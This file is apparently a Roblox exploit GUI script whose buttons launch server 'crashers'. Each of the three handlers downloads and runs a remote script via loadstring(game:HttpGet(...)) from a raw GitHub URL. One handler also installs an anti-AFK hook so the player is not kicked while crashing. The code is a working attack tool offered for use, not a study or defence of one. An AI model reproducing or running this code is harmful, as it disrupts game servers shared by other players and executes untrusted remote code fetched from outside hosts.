--/ Script Logic

SwagmodeWalletCrash.MouseButton1Down:connect(function()


    if(executed == false) then

        print("Executing Swagmode Crash")
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Chiiicken5538/lua-scripts/main/swagcrash.lua'))()
        executed = true

    elseif(executed == true) then 

        game.StarterGui:SetCore("SendNotification", {
            Title = "chiiickens Crashing GUI";
            Text = "You already executed one Crasher - If you really want to execute it still press in the next 2 Seconds again on the Crasher.";
            Duration = 5;
        })
        
        executed = false
        wait(2)
        executed = true
    end

end)

ModifiesSwagmodeCrash.MouseButton1Down:connect(function()

    if(executed == false) then

        print("Executing Modified Swagmode crasher")
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Chiiicken5538/lua-scripts/main/modified_swagcrash"))()
        executed = true

    elseif(executed == true) then 

        game.StarterGui:SetCore("SendNotification", {
            Title = "chiiickens Crashing GUI";
            Text = "You already executed one Crasher - If you really want to execute it still press in the next 2 Seconds again on the Crasher.";
            Duration = 5;
        })
        
        executed = false
        wait(2)
        executed = true
    end

end)

Encrypt15Min.MouseButton1Down:connect(function()

    if(executed == false) then
        
        print("Executed AntiAFK to prevent getting kicked while crashing...")
        
        game:GetService("Players").LocalPlayer.Idled:connect(function()
            vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
            wait(1)
            vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
        end)

     print("Executed Encrypts 15 Minute Crasher")
     loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dhcquickcrash.lua"))()
     executed = true
    
    elseif(executed == true) then 

        game.StarterGui:SetCore("SendNotification", {
            Title = "chiiickens Crashing GUI";
            Text = "You already executed one Crasher - If you really want to execute it still press in the next 2 Seconds again on the Crasher.";
            Duration = 5;
        })
        
        executed = false
        wait(2)
        executed = true
    end
end)


